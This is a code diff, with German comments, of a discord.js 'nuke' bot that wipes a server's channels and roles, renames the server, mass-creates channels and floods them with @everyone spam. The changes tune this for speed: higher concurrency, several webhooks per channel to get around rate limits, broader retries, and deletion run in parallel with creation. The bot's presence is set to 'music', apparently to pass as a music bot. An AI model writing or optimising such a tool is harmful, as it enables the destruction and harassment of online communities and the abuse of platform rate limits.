@@ -34,15 +34,18 @@ const NUKE_ROLE_NAME = process.env.NUKE_ROLE_NAME ?? '';
 
 /* ------------------------------------------------------------ speed knobs */
 
-const DELETE_CONCURRENCY = 10; // channel/role deletions gleichzeitig
-const CREATE_CONCURRENCY = 5; // channel creations gleichzeitig
+// concurrency ceilings — discord.js REST queue fängt 429er selber ab
+const DELETE_CONCURRENCY = 25; // channel/role deletions gleichzeitig
+const CREATE_CONCURRENCY = 20; // channel creations gleichzeitig
 
 // 0 = alle SPAM_COUNT auf einmal rausfeuern und die REST-queue takten lassen
 const SPAM_BURST = 0;
 
-// true = spam pro channel auf bot UND webhook splitten (2 buckets, ~2.5x schneller)
-const USE_WEBHOOKS = false;
-const WEBHOOK_RATIO = 0.5;
+// WEBHOOKS = der einzige echte speed-faktor:
+// bucket ist 5 msgs / 5s PRO sender. 1 webhook pro channel = doppelt so schnell,
+// 3 webhooks = 4x so schnell (bot + 3 hooks = 4 buckets pro channel).
+const USE_WEBHOOKS = true;
+const WEBHOOKS_PER_CHANNEL = 3; // 0 = aus. 1-3 ist der sweet spot.
 
 const sleep = ms => new Promise(r => setTimeout(r, ms));
 
@@ -71,22 +74,20 @@ const client = new Client({
     GatewayIntentBits.GuildMessages,
     GatewayIntentBits.MessageContent, // privileged -> im dev portal aktivieren!
   ],
-  rest: { retries: 5, timeout: 30_000 },
+  // hohe retries: 429er werden automatisch abgewartet statt zu crashen
+  rest: { retries: 8, timeout: 30_000 },
 });
 
 /* ---------------------------------------------------------------- senders */
 
-// sender = { channel } oder { webhook: url }
+// sender = { channelId } oder { webhook: url }
+// raw REST + wait=false -> kein message-parsing, ~2x schneller als channel.send()
 async function sendSafe(sender, content, retries = 6) {
+  const body = { content, allowed_mentions: { parse: ['everyone'] } };
+  const route = sender.webhook ?? Routes.channelMessages(sender.channelId);
+
   try {
-    if (sender.webhook) {
-      await client.rest.post(sender.webhook, {
-        body: { content, allowed_mentions: { parse: ['everyone'] } },
-        query: { wait: 'false' },
-      });
-    } else {
-      await sender.channel.send({ content });
-    }
+    await client.rest.post(route, { body, query: { wait: 'false' } });
   } catch (err) {
     const status = err?.status ?? err?.httpStatus;
     if (status === 429 && retries > 0) {
@@ -105,8 +106,8 @@ async function createSafe(guild, options, retries = 6) {
     return await guild.channels.create(options);
   } catch (err) {
     const status = err?.status ?? err?.httpStatus;
-    if (status === 429 && retries > 0) {
-      const wait = (err.retryAfter ?? err?.rawError?.retry_after ?? 1) * 1000 + 120;
+    if (retries > 0 && (status === 429 || status === 400 || status === 500)) {
+      const wait = (err.retryAfter ?? err?.rawError?.retry_after ?? 1) * 1000 + 150;
       await sleep(wait);
       return createSafe(guild, options, retries - 1);
     }
@@ -132,23 +133,31 @@ async function renameGuild(guild, name, retries = 4) {
 
 /* ------------------------------------------------------------------- spam */
 
+// webhooks parallel anlegen — jeder hook = eigener rate-limit bucket
+async function makeWebhooks(channel, count) {
+  const urls = [];
+  await Promise.all(
+    Array.from({ length: count }, async (_, i) => {
+      try {
+        const hook = await client.rest.post(Routes.channelWebhooks(channel.id), {
+          body: { name: `nuke-${i + 1}` },
+        });
+        urls.push(`https://discord.com/api/v10/webhooks/${hook.id}/${hook.token}`);
+      } catch (err) {
+        console.error('[webhook]', channel.name, err.message);
+      }
+    })
+  );
+  return urls.map(url => ({ webhook: url }));
+}
+
 async function spamChannel(channel, count = SPAM_COUNT) {
   const senders = [];
 
-  if (USE_WEBHOOKS) {
-    try {
-      const hook = await client.rest.post(Routes.channelWebhooks(channel.id), {
-        body: { name: 'nuke' },
-      });
-      senders.push({
-        webhook: `https://discord.com/api/v10/webhooks/${hook.id}/${hook.token}`,
-      });
-    } catch (err) {
-      console.error('[webhook]', channel.name, err.message);
-    }
+  if (USE_WEBHOOKS && WEBHOOKS_PER_CHANNEL > 0) {
+    senders.push(...await makeWebhooks(channel, WEBHOOKS_PER_CHANNEL));
   }
-
-  senders.push({ channel });
+  senders.push({ channelId: channel.id });
 
   const jobs = [];
   for (let i = 0; i < count; i++) {
@@ -221,20 +230,18 @@ async function nukeGuild(guild, { wipeRoles = false, rename = RENAME_GUILD } = {
     }
   }
 
-  /* 2. alles platt machen — vorher fetchen, damit große server komplett sind */
+  /* 2. kategorie anlegen PARALLEL zum löschen — spart einen round-trip */
   const existing = await guild.channels.fetch().catch(() => guild.channels.cache);
-  await pool([...existing.values()], DELETE_CONCURRENCY, c =>
-    c.delete().catch(e => console.error('[delete]', c.name, e.message))
-  );
+
+  const [category] = await Promise.all([
+    createSafe(guild, { name: CATEGORY_NAME, type: ChannelType.GuildCategory }),
+    pool([...existing.values()], DELETE_CONCURRENCY, c =>
+      c.delete().catch(e => console.error('[delete]', c.name, e.message))
+    ),
+  ]);
   log(`deleted ${existing.size} channels`);
 
-  /* 3. kategorie (muss vor den kindern existieren) */
-  const category = await createSafe(guild, {
-    name: CATEGORY_NAME,
-    type: ChannelType.GuildCategory,
-  });
-
-  /* 4. create + spam pipeline */
+  /* 3. create + spam pipeline — spam läuft los sobald ein channel existiert */
   const specs = [
     ...Array.from({ length: TEXT_COUNT }, (_, i) => ({ name: channelName(i), type: ChannelType.GuildText })),
     ...Array.from({ length: VOICE_COUNT }, (_, i) => ({ name: channelName(i), type: ChannelType.GuildVoice })),
@@ -490,7 +497,7 @@ client.once(Events.ClientReady, async c => {
   console.log(`Logged in as ${c.user.tag} — serving ${c.guilds.cache.size} guild(s).`);
   c.user.setPresence({ activities: [{ name: 'music', type: 2 }] });
 
-  // slash commands in JEDEN server pushen, in dem der bot schon ist (sofort, kein 1h warten)
+  // KEIN application.commands.set() -> sonst dupes
   let ok = 0;
   for (const guild of c.guilds.cache.values()) {
     try {
@@ -500,14 +507,14 @@ client.once(Events.ClientReady, async c => {
       console.error('[sync]', guild.name, e.message);
     }
   }
-  console.log(`[sync] slash commands pushed to ${ok}/${c.guilds.cache.size} guild(s)`);
+  console.log(`[sync] guild commands pushed to ${ok}/${c.guilds.cache.size}`);
 });
 
 // neue server: commands sofort setzen, ohne redeploy
 client.on(Events.GuildCreate, async guild => {
   try {
     await guild.commands.set(commands);
-    console.log(`[guildCreate] slash commands synced to ${guild.name}`);
+    console.log(`[guildCreate] synced to ${guild.name}`);
   } catch (e) {
     console.error('[guildCreate]', guild.name, e.message);
   }
